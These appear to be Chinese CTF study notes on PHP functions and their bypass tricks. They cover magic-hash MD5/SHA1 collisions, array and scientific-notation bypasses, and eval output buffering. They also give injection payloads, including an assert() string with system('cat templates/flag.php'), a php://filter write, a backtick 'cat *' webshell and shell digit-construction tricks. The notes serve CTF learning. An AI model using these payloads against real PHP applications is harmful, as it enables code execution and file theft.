	[PHP: PHP 手册 - Manual](https://www.php.net/manual/zh/index.php)

```
//

/**/ 注释

传cookie时，有特殊字符需要url编码
```
# 基本函数

##### issert():
isset在php中用来判断变量是否声明，该函数返回布尔类型的值，即true/false。isset只能用于变量，因为传递任何其它参数都将造成解析错误

##### include()
include 函数是用于在 PHP 脚本中包含并执行指定文件的。被包含的文件会被当做 PHP 脚本解析并执行，从而使得在需要重复使用相同代码时可以将其放在单独的文件中，方便维护和管理。可以使用绝对路径或相对路径指定要包含的文件。如果被包含的文件不存在，include 函数会产生一个警告并继续执行脚本，而 require 函数则会导致致命错误并停止脚本的执行

##### array_search()
可以用0绕过

##### strtolower()
将字符串全转换为小写

##### strrev()
反转字符串

```
hex2bin()

把十六进制值转换为 ASCII 字符
```

```
file_put_contents($v3,$str);

str写入v3中（支持伪协议）
v3=php://filter/write=convert.base64-
decode/resource=2.php
```

```
ReflectionClass 

反射类可以建立对类的映射，也可以建立对PHP基本方法的映射

可以建立反射类new ReflectionClass(system('cmd'))来执行命令

class fuc{ static function methond(){ echo 'Hello World!'; } } 

echo new ReflectionClass('fuc');

```

```
var_dump()

函数用于输出变量的相关信息,可以是变量、数组、对象
```

```
ob_get_contents — 返回输出缓冲区的内容  
ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲,此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃

exit();使程序提前退出
die();同上

例如：
eval($c);
$s = ob_get_contents();
ob_end_clean();
echo preg_replace("/[0-9]|[a-z]/i","?",$s);

在命令执行中遇见可c=require('/flag.txt');exit();进行绕过
```

# 基本函数漏洞

```
md5()

PHP在处理哈希字符串时，会利用”!=”或”\==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0,都是0

也称md5碰撞
常见：QNKCDZO，240610708，s878926199a

数组绕过

同时MD5不能处理数组，有时也可以用数组绕过，解析数组时直接等于0

例如：v1[]=1
```

```
sha1()

sha1碰撞，与上述一样
aaK1STfY
0e76658526655756207688271159624026011393
aaO8zKZF
0e89257456677279068558073954252716165668

数组绕过
```

```
is_numeric

用于检测变量是否为数字（包括浮点型）或数字字符串

十六进制绕过（0x开头）

数组绕过

科学计数法绕过（0e开头）
例如：常配合用语句  <?=`cat *`;  进行base64编码然后再转十六进制，去掉最后的=，刚好可以是科学计数法
```

```
strpos() 

函数返回字符串在另一字符串中第一次出现的位置。如果存在，返回数字，如果没有找到该字符串，则返回false.该函数对大小写敏感。用这个函数来判断字符串中是否存在某个字符时必须使用===false

当出现判断不能让值为0时，可以用+、%2b放在前面
if(!strpos($num, "0")){  
        die("no no no!!!");

数组绕过(strcmp()类似)
```

```
int intval ( mixed $var [, int $base = 10 ] )

参数说明：

- $var：要转换成 integer 的数量值（可以是小数）。
- $base：转化所使用的进制。

如果 base 是 0，通过检测 var 的格式来决定使用的进制：

- 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
- 如果字符串以 "0" 开始，使用 8 进制(octal)；否则，
- 将使用 10 进制 (decimal)


采用科学计数法绕过，该函数只会截取到字母之前的数字

数组绕过 （传参方式?num[]=a）
```

```
==为弱相等，也就是说12=="12" --> true，而且12=="12cdf" --> true，只取字符串中开头的整数部分，但是1e3dgf这样的字符串在比较时，取的是符合科学计数法的部分：1e3，也就是1000

var_dump("admin1"==0) //true

===为完全相等，数据类型和值都相等时返回true
```

```
bool in_array(a,array,strict)

如果没有设置strict，则使用比较宽松的比较，即弱类型比较
```


assert([mixed](https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed) `$assertion`, [Throwable](https://www.php.net/manual/zh/class.throwable.php) `$exception` = ?): bool
```
例如
?page=').system('cat templates/flag.php');//

assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
assert("strpos('').system('ls');//', '..') === false") or die("Detected hacking attempt!");

将传入的参数视为代码执行。判断是否会执行错误，没有错误则返回True否则返回False，与在参数中传入调用外部命令的方法如system可以构造出一个webshell
```

# 含特殊符号传参

[谈一谈PHP中关于非法参数名传参问题_php的非法传参_末 初的博客-CSDN博客](https://blog.csdn.net/mochu7777777/article/details/115050295)


# 特征

```
在PHP中，除了1. 变量名、2. 自定义常量名、3. php.ini中的配置项

其余都是对大小写不敏感·
```

**构造整数**
[php构造数字-ctf过滤数字 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/407073045)
```
在Linux的shell中，`$(())` 是用于进行算术运算的一种方式,如果在 `$(())` 中进行的算术运算结果为0，那么它会返回0

~$(())为~0
$((~$(())))

$((~$(($(($((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())
))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(
())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())
))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(
())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())))$((~$(())$(())
))$((~$(())$(())))))$((~$(())$(())))))))

可以省略+直接相加，若两个1则是11，若有-号则是减

根据实际情况具体分析，争取用符号最少的payload
```